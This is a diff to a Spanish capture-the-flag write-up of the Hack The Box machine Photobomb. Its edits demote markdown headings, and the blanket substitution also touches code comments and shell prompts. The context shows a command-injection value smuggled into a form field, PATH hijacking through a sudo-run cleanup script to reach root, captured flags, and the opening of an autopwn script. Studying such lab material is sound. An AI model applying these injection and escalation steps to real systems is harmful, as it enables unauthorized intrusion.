@@ -2,14 +2,14 @@
 title: Photobomb WriteUp
 date: 2023-02-11 06:00:00 +/-TTTT
 categories: [HTB, Linux]
-tags: [command injection, sudoers, path hijacking]     # TAG names should always be lowercase
+tags: [command injection, sudoers, path hijacking]     ## TAG names should always be lowercase
 image: photobomb.jpg
 img_path: /photos/2023-02-11-Photobomb-WriteUp/
 ---
 
 ***Photobomb*** es una máquina ***Linux*** en la que conseguiremos **ejecución remota de comandos** aprovechándonos de una **inyección de comandos**, acontecida en la página web. Para la escalada, nos aprovecharemos de un privilegio que el usuario *wizard* tiene asignado a nivel de ***sudoers***. En el **Anexo**, inspeccionaremos el **código vulnerable a inyección de comandos** y también mostraré un *script* que automatiza tanto la **intrusión** coma la **escalada** de la máquina.
 
-# Información de la máquina
+## Información de la máquina
 
 <table width="100%" cellpadding="2">
     <tr>
@@ -22,9 +22,9 @@ img_path: /photos/2023-02-11-Photobomb-WriteUp/
     </tr>
 </table>
 
-# Reconocimiento
+## Reconocimiento
 
-## ping
+### ping
 
 Mandamos un _ping_ a la máquina víctima, con la finalidad de conocer su sistema operativo y saber si tenemos conexión con la misma. Un _TTL_ menor o igual a 64 significa que la máquina es _Linux_ y un _TTL_ menor o igual a 128 significa que la máquina es _Windows_.
 
@@ -40,7 +40,7 @@ rtt min/avg/max/mdev = 105.681/105.681/105.681/0.000 ms
 
 Vemos que nos enfrentamos a una máquina **_Linux_**, ya que su *TTL* es 63.
 
-## Port discovery
+### Port discovery
 
 Procedemos a escanear todo el rango de puertos de la máquina víctima, con la finalidad de encontrar aquellos que estén abiertos (_status open_). Lo hacemos con la herramienta ***nmap***.
 
@@ -81,11 +81,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 El puerto **22** es **SSH** y el puerto **80** **HTTP**. De momento, al no disponer de credenciales para autenticarnos por _SSH_, nos centraremos en auditar el puerto **80**.
 
-## Puerto 80 abierto (HTTP)
+### Puerto 80 abierto (HTTP)
 
 Gracias a los _scripts_ de reconocimiento que lanza _nmap_, nos damos cuenta de que el servicio web que corre en el puerto **80** nos redirige al dominio ***photobomb.htb***. Para que nuestra máquina pueda resolver a este dominio deberemos añadirlo al final de nuestro _/etc/hosts_, de la forma:  `10.10.11.180 photobomb.htb`
 
-### Tecnologías utilizadas
+#### Tecnologías utilizadas
 
 En primer lugar, utilizaremos **_whatweb_** para enumerar las tecnologías que corren detrás del servicio web. Nos encontramos con lo siguiente:
 
@@ -97,7 +97,7 @@ http://photobomb.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu L
 
 La IP nos redirecciona a *photobomb.htb*, como ya sabíamos. La web está usando como servidor web *nginx 1.18.0*.
 
-### Inspeccionando la web
+#### Inspeccionando la web
 
 Al acceder a http://photobomb.htb vemos lo siguiente:
 
@@ -139,9 +139,9 @@ Interceptaremos la petición por *POST* con *Burpsuite*, para inspeccionar los d
 
 Es posible que el servidor, con esta información, esté aplicando un **comando a nivel de sistema** para obtener la imagen deseada. Si es así, podríamos intentar **inyectar un comando** en alguno de los campos anteriores.
 
-# Consiguiendo shell como wizard
+## Consiguiendo shell como wizard
 
-## Command Injection
+### Command Injection
 
 *Command Injection* es un tipo de vulnerabilidad de seguridad en la que un **atacante** puede **ejecutar comandos arbitrarios** en el sistema operativo de un servidor web o aplicación. Esto sucede cuando **la aplicación no valida correctamente los datos de entrada** antes de utilizarlos en una operación del sistema.
 
@@ -199,7 +199,7 @@ export SHELL=bash
 
 También deberíamos ajustar el número de filas y de columnas. Con el comando **_stty size_** podremos consultar las filas y columnas de nuestra consola y con el comando **_stty rows <n.filas\> cols \<n.columnas\>_** podremos ajustar estos campos en la *shell* recibida.
 
-## user.txt
+### user.txt
 
 La primera *flag* se encuentra en el *homedir* del usuario *wizard*:
 
@@ -208,11 +208,11 @@ wizard@photobomb:~$ cat user.txt
 4b8fd12b605b9d4ab4173a32bd95f69c
 ```
 
-# Consiguiendo shell como root
+## Consiguiendo shell como root
 
-## Reconocimiento del sistema
+### Reconocimiento del sistema
 
-### sudoers
+#### sudoers
 
 Para listar los privilegios de **_sudo_** asignados al usuario *developer*, utilizaremos el comando `sudo -l`:
 
@@ -235,14 +235,14 @@ El contenido de */opt/cleanup.sh* es el siguiente:
 . /opt/.bashrc
 cd /home/wizard/photobomb
 
-# clean up log files
+## clean up log files
 if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
 then
   /bin/cat log/photobomb.log > log/photobomb.log.old
   /usr/bin/truncate -s0 log/photobomb.log
 fi
 
-# protect the priceless originals
+## protect the priceless originals
 find source_images -type f -name '*.jpg' -exec chown root:root {} \;
 ```
 
@@ -255,7 +255,7 @@ Este *script* realiza las siguientes acciones:
 
 Para el comando *find*, se está utilizando una ruta relativa y no una absoluta. Pudiendo modificar el valor de una variable de entorno durante la ejecución del programa, podríamos llevar a cabo un *path hijacking* y así hacer que el usuario *root* ejecute los comandos que le indiquemos.
 
-## Path hijacking
+### Path hijacking
 
 Cuando introducimos un **comando** **sin especificar la ruta absoluta**, el sistema busca en la variable ***$PATH***, de izquierda a derecha, el directorio donde se encuentra ese binario. Por ejemplo, la ruta absoluta en mi sistema del comando *find* es */usr/bin/find*. El valor de mi *\$PATH*  es:
 
@@ -303,35 +303,35 @@ Nos *spawneamos* una shell como *root* con el comando `bash -p`:
 
 ```bash
 wizard@photobomb:/tmp$ bash -p
-bash-5.0# whoami
+bash-5.0## whoami
 root
 ```
 
-## root.txt
+### root.txt
 
 La última *flag* se encuentra en el *homedir* de *root*:
 
 ```bash
-bash-5.0# cd /root/
-bash-5.0# cat root.txt
+bash-5.0## cd /root/
+bash-5.0## cat root.txt
 c1526a773f48d893614094895204b186
 ```
 
-# Anexo
+## Anexo
 
-## Inspección de código vulnerable a inyección de comandos
+### Inspección de código vulnerable a inyección de comandos
 
 Este es el código que se encarga de recibir los datos que tramitamos por POST al descargar una imagen. Lo encontraremos en el directorio *~/photobomb/server.rb*:
 
 ```ruby
-# server.rb
+## server.rb
 
 post '/printer' do
   photo = params[:photo]
   filetype = params[:filetype]
   dimensions = params[:dimensions]
 
-  # handle inputs
+  ## handle inputs
   if photo.match(/\.{2}|\//)
     halt 500, 'Invalid photo.'
   end
@@ -389,7 +389,7 @@ Si alguna de estas validaciones falla, se detiene la ejecución y se devuelve un
 * En el parámetro *dimensions*, tampoco se puede inyectar comandos, puesto que el contenido de la variable deben ser números separados por una *x*.
 * En el parámetro *filetype*, en cambio, se verifica si el contenido empieza por *jpg* o *png*, pero no si acaba por uno de estos valores, pudiendo inyectar un comando de la forma `png o jpg; $(whoami)`.
 
-## Script autopwn
+### Script autopwn
 
 El siguiente *script* automatiza tanto la intrusión como la escalada de la máquina. Para ejecutarlo, simplemente `python3 exploit.py <IP_tun0> <puerto>`:
 
@@ -399,11 +399,11 @@ El siguiente *script* automatiza tanto la intrusión como la escalada de la máq
 import signal,sys,requests,threading,time,http.server,socketserver,os
 from pwn import *
 
-# Variables globales
+## Variables globales
 lhost=''
 lport = ''
 
-# Ctrl + C
+## Ctrl + C
 def def_handler(sig,frame):
 	print("[!] Saliendo...")
 	sys.exit(1)
